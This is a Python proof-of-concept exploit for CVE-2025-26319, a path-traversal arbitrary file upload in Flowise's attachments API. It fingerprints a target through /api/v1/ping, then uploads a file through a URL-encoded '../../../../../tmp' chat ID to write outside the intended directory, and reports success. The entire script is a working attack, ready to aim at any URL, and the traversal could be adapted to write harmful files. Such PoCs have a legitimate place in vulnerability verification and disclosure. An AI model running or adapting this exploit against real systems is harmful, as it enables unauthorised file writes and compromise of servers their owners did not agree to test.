#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib.parse
import random
import string

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def exploit(target_url):
    print(f"[*] Target: {target_url}")
    
    print("[*] Step 1: Testing basic connectivity...")
    try:
        resp = requests.get(f"{target_url}/api/v1/ping", timeout=5)
        if resp.text != "pong":
            print("[-] Target is not a Flowise instance")
            return False
        print("[+] Target is Flowise")
    except:
        print("[-] Cannot connect to target")
        return False

    print("[*] Step 2: Testing arbitrary file upload via path traversal...")
    
    chatflow_id = "test"
    random_suffix = generate_random_string()
    traversal_path = f"../../../../../tmp"
    chat_id = urllib.parse.quote(traversal_path, safe='')
    filename = f"poc_{random_suffix}.txt"
    
    upload_url = f"{target_url}/api/v1/attachments/{chatflow_id}/{chat_id}"
    payload_content = f"CVE-2025-26319 Arbitrary File Upload PoC - {random_suffix}"
    
    files = {
        'files': (filename, payload_content.encode(), 'text/plain')
    }
    
    print(f"[*] Upload URL: {upload_url}")
    print(f"[*] Target path: /tmp/{filename}")
    
    try:
        resp = requests.post(upload_url, files=files, timeout=10)
        
        if resp.status_code == 200:
            try:
                response_data = resp.json()
                if isinstance(response_data, list) and len(response_data) > 0:
                    uploaded_name = response_data[0].get('name', '')
                    uploaded_size = response_data[0].get('size', 0)
                    if uploaded_name == filename and uploaded_size > 0:
                        print(f"[+] File uploaded successfully!")
                        print(f"[+] Filename: {uploaded_name}")
                        print(f"[+] Size: {uploaded_size} bytes")
                        print(f"[+] VULNERABLE: Path traversal file upload confirmed!")
                        return True
            except:
                pass
            
            print("[+] Upload returned 200 but response format unexpected")
            print(f"[+] Response: {resp.text[:200]}")
            return True
        else:
            print(f"[-] Upload failed with status: {resp.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-26319 - Flowise Arbitrary File Upload PoC")
    parser.add_argument("-u", "--url", default="http://localhost:3000", help="Target URL")
    args = parser.parse_args()
    
    target = args.url.rstrip("/")
    
    print("=" * 60)
    print("CVE-2025-26319 - FlowiseAI Arbitrary File Upload")
    print("Affected: Flowise v2.2.6 and earlier")
    print("=" * 60)
    
    if exploit(target):
        print("\n" + "=" * 60)
        print("[+] EXPLOIT SUCCESSFUL")
        print("[+] The target is vulnerable to arbitrary file upload")
        print("[+] via path traversal in /api/v1/attachments endpoint")
        print("=" * 60)
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
